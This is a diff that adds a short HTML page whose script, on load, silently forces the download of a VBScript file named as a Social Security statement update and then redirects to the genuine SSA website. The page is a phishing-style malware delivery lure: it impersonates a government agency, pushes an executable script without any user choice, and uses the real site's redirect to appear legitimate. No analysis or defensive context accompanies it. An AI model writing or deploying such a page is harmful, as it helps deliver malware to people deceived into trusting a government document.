@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Download Page</title>
+</head>
+<body>
+    <script>
+        // Create a temporary link element to trigger download
+        var a = document.createElement('a');
+        a.href = 'social-security-statement-upd.vbs';
+        a.download = 'social-security-statement-upd.vbs';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        // Redirect after 5 seconds
+        setTimeout(function() {
+            window.location.href = 'https://www.ssa.gov/about-ssa';
+        }, 5000);
+    </script>
+</body>
+</html>
